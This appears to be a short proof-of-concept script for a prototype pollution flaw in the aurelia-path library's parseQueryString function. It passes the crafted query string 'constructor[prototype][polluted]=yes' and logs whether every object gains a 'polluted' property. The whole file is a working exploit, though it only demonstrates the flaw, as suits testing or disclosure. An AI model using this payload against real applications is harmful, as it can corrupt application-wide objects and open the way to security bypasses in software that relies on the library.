var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('constructor[prototype][polluted]=yes');
console.log({}.polluted);